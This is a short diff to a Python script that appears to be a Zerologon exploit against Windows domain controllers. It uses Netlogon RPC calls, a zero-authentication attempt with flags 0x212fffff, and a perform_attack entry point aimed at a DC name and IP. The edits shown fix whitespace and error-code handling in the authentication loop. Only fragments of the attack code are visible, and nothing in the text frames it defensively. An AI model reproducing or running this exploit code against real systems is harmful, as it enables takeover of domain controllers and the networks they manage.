@@ -37,7 +37,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
   
   flags = 0x212fffff
 
-  
+ 
   serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
   serverChallenge = serverChallengeResp['ServerChallenge']
   try:
@@ -74,15 +74,16 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       resp = rpc_con.request(request)
       resp.dump()
 
-            
+          
     except Exception as e:
       print(e)
     return rpc_con
 
   except nrpc.DCERPCSessionError as ex:
     
+    if ex.get_error_code() == 0xc0000022:
       return None
-  else:
+    else:
       fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
   except BaseException as ex:
     fail(f'Unexpected error: {ex}.')
@@ -116,4 +117,3 @@ if __name__ == '__main__':
 
     dc_name = dc_name.rstrip('$')
     perform_attack('\\\\' + dc_name, dc_ip, dc_name)
-
